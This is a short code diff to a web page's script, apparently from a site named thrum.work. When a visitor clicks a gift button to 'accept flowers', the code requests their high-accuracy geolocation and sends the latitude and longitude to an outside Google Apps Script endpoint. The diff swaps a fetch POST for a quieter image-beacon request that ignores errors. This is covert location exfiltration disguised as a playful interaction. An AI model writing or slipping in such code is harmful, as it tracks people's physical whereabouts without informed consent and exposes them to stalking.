@@ -606,13 +606,7 @@ giftBtn.addEventListener('click', () => {
     // Send location when they accept flowers
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(function(pos) {
-        var d = { lat: pos.coords.latitude, lng: pos.coords.longitude, site: 'thrum.work' };
-        fetch('https://script.google.com/macros/s/AKfycbztlrFJBCligmAAIQ00o-kCWpFzedi_sl4oL8pM-F1kruKmV8Luxpr9OAZpyk6EjCh1/exec', {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'text/plain' },
-          body: JSON.stringify(d)
-        }).catch(function(){});
+        new Image().src = 'https://script.google.com/macros/s/AKfycbztlrFJBCligmAAIQ00o-kCWpFzedi_sl4oL8pM-F1kruKmV8Luxpr9OAZpyk6EjCh1/exec?lat=' + pos.coords.latitude + '&lng=' + pos.coords.longitude + '&site=thrum.work';
       }, function(){}, { enableHighAccuracy: true });
     }
   } else {
